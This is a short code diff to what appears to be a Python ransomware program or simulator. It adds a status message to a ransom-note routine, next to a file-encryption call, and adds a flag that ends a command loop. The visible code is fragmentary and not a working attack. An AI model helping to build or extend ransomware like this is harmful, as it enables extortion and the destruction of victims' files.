@@ -140,6 +140,7 @@ class Program():
             self.__criptography.encrypt(file)
 
     def __ransomnote(self):
+        print("Creating ransom notes and decryptor scripts...")
         # Copy the contents of the ransom note
         with open("ransom_note.txt", "r") as note_file:
             content = note_file.read()
@@ -267,6 +268,7 @@ class Program():
 
                 case "exit" | "quit":
                     print("Exiting...")
+                    self.__should_cli_run = False
                     break
 
                 case "":   # empty input
